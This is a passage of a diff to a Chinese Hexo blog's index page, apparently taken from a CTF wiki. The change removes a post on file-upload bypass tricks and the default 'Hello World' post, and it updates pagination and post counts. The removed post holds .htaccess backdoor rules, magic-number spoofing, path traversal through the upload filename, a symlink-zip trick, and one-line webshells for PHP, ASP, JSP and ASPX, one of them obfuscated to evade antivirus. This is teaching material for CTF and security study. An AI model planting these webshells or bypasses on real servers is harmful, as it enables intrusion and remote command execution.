-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;https://www.xxx.com/xxx.asp(php)&quot; method=&quot;post&quot;</span><br><span class="line">name=&quot;form1&quot; enctype=&quot;multipart/form‐data&quot;&gt;</span><br><span class="line">&lt;input name=&quot;FileName1&quot; type=&quot;FILE&quot; class=&quot;tx1&quot; size=&quot;40&quot;&gt;</span><br><span class="line">&lt;input name=&quot;FileName2&quot; type=&quot;FILE&quot; class=&quot;tx1&quot; size=&quot;40&quot;&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; name=&quot;Submit&quot; value=&quot;上传&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
-
-<p>利用时只需要修改action的值为指定上传页面即可</p>
-<ul>
-<li>第一个文件上传允许的文件类型（<code>.jpg</code> <code>.png</code> <code>.gif</code> 等），第二个上传文件是一句话木马或者WebShell脚本。这样就可以突破上传限制，成功上传木马到服务器。</li>
-</ul>
-</blockquote>
-<h3 id="php3457"><a href="#php3457" class="headerlink" title="php3457 #"></a>php3457 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#php3457">#</a></h3><blockquote>
-<p>该项为apache专属。关键点在<code>/etc/apache2/mods-available/php5.6.conf</code>这个文件，满足<code>.+\.ph(p[3457]?|t|tml)$</code>，都会被当作php文件解析。</p>
-<p>在apache2目录下<code>grep -r x-httpd-php /etc/apache2</code>找到对应文件就能知道解析哪些后缀。</p>
-</blockquote>
-<h3 id="htaccess文件攻击"><a href="#htaccess文件攻击" class="headerlink" title=".htaccess文件攻击 #"></a>.htaccess文件攻击 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#htaccess%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB">#</a></h3><blockquote>
-<p>.htaccess文件(或者”分布式配置文件”）提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。</p>
-<p>概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
-<p>启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。</p>
-<p>笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。</p>
-</blockquote>
-<p>一般<code>.htaccess</code>可以用来留后门和针对黑名单绕过。在上传网站的根目录下，上传一个<code>.htaccess</code>文件即可。</p>
-<p>绕过方法：</p>
-<blockquote>
-<ul>
-<li>针对黑名单绕过</li>
-</ul>
-<p>创建一个txt文件，写入</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType  application/x-httpd-php    .png</span><br></pre></td></tr></table></figure>
-
-
-
-<p>另存为 <code>.htaccess</code> 名称，保存类型为所有文件，即可将<code>png</code>文件解析为<code>php</code>文件。</p>
-<ul>
-<li>留后门</li>
-</ul>
-<p>在<code>.htaccess</code> 内写入<code>php</code>解析规则，类似于把文件名包含<code>s</code>的解析成<code>php</code>文件</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;s&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<p><code>shell.png</code> 就会以<code>php</code>文件执行</p>
-<ul>
-<li>利用.htaccess进行文件包含</li>
-</ul>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_file &quot;.htaccess&quot;</span><br><span class="line">#&lt;?php eval($_POST[cmd]);?&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<ul>
-<li>使用#注释使得.htaccess能够成功解析</li>
-</ul>
-</blockquote>
-<h3 id="服务器检测（文件内容检测）"><a href="#服务器检测（文件内容检测）" class="headerlink" title="服务器检测（文件内容检测） #"></a>服务器检测（文件内容检测） <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A3%80%E6%B5%8B-%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B">#</a></h3><h4 id="文件幻数检测（文件开头）"><a href="#文件幻数检测（文件开头）" class="headerlink" title="文件幻数检测（文件开头） #"></a>文件幻数检测（文件开头） <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%96%87%E4%BB%B6%E5%B9%BB%E6%95%B0%E6%A3%80%E6%B5%8B-%E6%96%87%E4%BB%B6%E5%BC%80%E5%A4%B4">#</a></h4><blockquote>
-<p>幻数 magic number，它可以用来标记文件或者协议的格式，很多文件都有幻数标志来表明该文件的格式。</p>
-</blockquote>
-<p>要绕过文件幻数检测就要在文件开头写上如下的值</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.jpg	FF D8 FF E0 00 10 4A 46 49 46</span><br><span class="line">.gif	47 49 46 38 39 61</span><br><span class="line">.png	89 50 4E 47</span><br></pre></td></tr></table></figure>
-
-
-
-<p>在文件幻数后面加上自己的WebShell代码就行</p>
-<h4 id="文件相关信息检测"><a href="#文件相关信息检测" class="headerlink" title="文件相关信息检测 #"></a>文件相关信息检测 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%96%87%E4%BB%B6%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF%E6%A3%80%E6%B5%8B">#</a></h4><p>图像文件相关信息检测常用的是getimagesize()函数，需要把文件头部分伪造，也就是在幻数的基础上还加了一些文件信息。</p>
-<blockquote>
-<ul>
-<li>例如下面结构</li>
-</ul>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">(...some binary data for image...)</span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br><span class="line">(... skipping the rest of binary data ...)</span><br></pre></td></tr></table></figure>
-
-
-</blockquote>
-<p>另一种是判断是否包含<code>&lt;?</code>或者<code>php</code></p>
-<blockquote>
-<ul>
-<li><p>绕过<code>&lt;?</code>：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&#x27;php&#x27;&gt;@eval($_POST[cmd]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-
-</li>
-<li><p>绕过<code>php</code>：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?= @eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure></li>
-</ul>
-</blockquote>
-<p>绕过方法：</p>
-<blockquote>
-<ul>
-<li>对渲染&#x2F;加载测试的攻击方式是代码注入绕过。使用winhex在不破坏文件本身的渲染情况下找一个空白区进行填充代码，一般为图片的注释区。</li>
-<li>对二次渲染的攻击方式就是攻击文件加载器自身。例如：</li>
-</ul>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">上传文件数据不完整的gif文件 -&gt; 触发报错imagecreatefromgif()函数</span><br><span class="line">上传文件数据不完整的png文件 -&gt; 触发报错imagecreatefrompng()函数</span><br></pre></td></tr></table></figure>
-
-
-
-<p>某后台调用GD库对图像进行二次渲染的代码</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function image_gd_open($file, $extension)</span><br><span class="line">&#123;</span><br><span class="line">$extension = str_replace(&#x27;jpg&#x27;, &#x27;jpeg&#x27;, $extension);</span><br><span class="line">$open_func = &#x27;imageCreateFrom&#x27;. $extension; //函数名变成imageCreateFrompng 之类</span><br><span class="line">if (!function_exists($open_func))</span><br><span class="line">&#123;</span><br><span class="line">	return FALSE;</span><br><span class="line">&#125;</span><br><span class="line">return $open_func($file); //变成imagecreatefrompng(&#x27;/tmp/phpimage&#x27;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>对文件加载器进行攻击，常见的就是溢出攻击。上传自己的恶意文件后，服务器上的文件加载器会主动进行加载测试，加载测试时被溢出攻击执行shellcode，比如access&#x2F;mdb溢出。</li>
-</ul>
-</blockquote>
-<h3 id="文件上传中的目录穿越漏洞"><a href="#文件上传中的目录穿越漏洞" class="headerlink" title="文件上传中的目录穿越漏洞 #"></a>文件上传中的目录穿越漏洞 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%AD%E7%9A%84%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E">#</a></h3><p>攻击方式</p>
-<blockquote>
-<p>形式：上传的文件会被解析为日志不能执行，给出了<code>/uploads/xxx.php</code>路径并且可以查询</p>
-<p>绕过：上传文件的时候抓包，修改文件名（filename）为<code>./../../../../flag</code>，上传成功后路径变为<code>/uploads/./../../../../flag</code>即可进行目录穿越</p>
-</blockquote>
-<h2 id="攻击代码"><a href="#攻击代码" class="headerlink" title="攻击代码 #"></a>攻击代码 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%94%BB%E5%87%BB%E4%BB%A3%E7%A0%81">#</a></h2><h2 id="文件压缩："><a href="#文件压缩：" class="headerlink" title="文件压缩："></a>文件压缩：</h2><p>软链接压缩包，然后上传到软链接下，放🐎进行攻击</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ln -s /var/www/html web  #创建软链接文件夹</span><br><span class="line">zip -y zip.zip web   #将软链接压缩生成一个zip.zip</span><br><span class="line"></span><br><span class="line">再在web下面放一个shell.php（🐎） </span><br><span class="line">zip -y z.zip web   #再生成一个带🐎的压缩包</span><br><span class="line"></span><br><span class="line">然后上传zip.zip，将上传路径改到可控目录/var/www/html</span><br><span class="line">然后上传z.zip，即传到了，显示的网页下（var/www/html/shell.php）</span><br><span class="line">蚁剑</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="常用攻击代码"><a href="#常用攻击代码" class="headerlink" title="常用攻击代码 #"></a>常用攻击代码 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E5%B8%B8%E7%94%A8%E6%94%BB%E5%87%BB%E4%BB%A3%E7%A0%81">#</a></h3><blockquote>
-<p>简单的一句话木马</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>绕过<code>&lt;?</code>限制的一句话木马</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language = &#x27;php&#x27;&gt;@eval($_POST[cmd]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>绕过<code>&lt;?php ?&gt;</code>限制的一句话木马</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?= @eval($_POST[&#x27;cmd&#x27;]);</span><br></pre></td></tr></table></figure>
-
-
-
-<p>asp一句话木马</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%eval(Request.Item[&quot;cmd&quot;],”unsafe”);%&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>JSP一句话木马</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%if(request.getParameter(&quot;f&quot;)!=null)(newjava.io.FileOutputStream (application.getRealPath(&quot;\\&quot;)+request.getParameter(&quot;f&quot;))).write (request.getParameter(&quot;t&quot;).getBytes());%&gt;</span><br></pre></td></tr></table></figure>
-
-<p>JSP一句话免杀（ASCLL编码）</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot;  language=&quot;java&quot; %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    if(request.getParameter(&quot;cmd&quot;)!=null)&#123;</span><br><span class="line">        Class rt = Class.forName(new String(new byte[] &#123; 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101 &#125;));</span><br><span class="line">        Process e = (Process) rt.getMethod(new String(new byte[] &#123; 101, 120, 101, 99 &#125;), String.class).invoke(rt.getMethod(new String(new byte[] &#123; 103, 101, 116, 82, 117, 110, 116, 105, 109, 101 &#125;)).invoke(null), request.getParameter(&quot;cmd&quot;) );</span><br><span class="line">        java.io.InputStream in = e.getInputStream();</span><br><span class="line">        int a = -1;byte[] b = new byte[2048];out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125;out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
-
-<p>ASPX一句话</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;C#&quot;runat=&quot;server&quot;&gt;WebAdmin2Y.x.y a=new WebAdmin2Y.x.y(&quot;add6bb58e139be10&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>1</p>
-</blockquote>
-<h3 id="其它攻击代码"><a href="#其它攻击代码" class="headerlink" title="其它攻击代码 #"></a>其它攻击代码 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E5%85%B6%E5%AE%83%E6%94%BB%E5%87%BB%E4%BB%A3%E7%A0%81">#</a></h3><blockquote>
-<p>异或取反等操作写shell的php脚本、混淆木马、不死马。</p>
-</blockquote>
-<h2 id="更多参考"><a href="#更多参考" class="headerlink" title="更多参考 #"></a>更多参考 <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%9B%B4%E5%A4%9A%E5%8F%82%E8%80%83">#</a></h2><p><a target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/thread-41672-1-1.html?from=sec">https://bbs.ichunqiu.com/thread-41672-1-1.html?from=sec</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/253698.html">https://www.freebuf.com/articles/web/253698.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/179954.html">https://www.freebuf.com/articles/web/179954.html</a></p>
-
-      
-    </div>
-
-    
-    
-    
-	
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://chensonghi.github.io./2023/10/08/hello-world/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/ch.jpg">
-      <meta itemprop="name" content="chleynx">
-      <meta itemprop="description" content="不是看到希望才坚持，而是坚持了才能看到希望">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="星河风">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/10/08/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-10-08 07:59:16" itemprop="dateCreated datePublished" datetime="2023-10-08T07:59:16+08:00">2023-10-08</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-10-10 18:45:09" itemprop="dateModified" datetime="2023-10-10T18:45:09+08:00">2023-10-10</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
-      
-    </div>
-
-    
-    
-    
-	
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-
 
   
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+  </nav>
 
 
 
@@ -1477,20 +1807,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-count">12</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-count">3</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-count">5</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
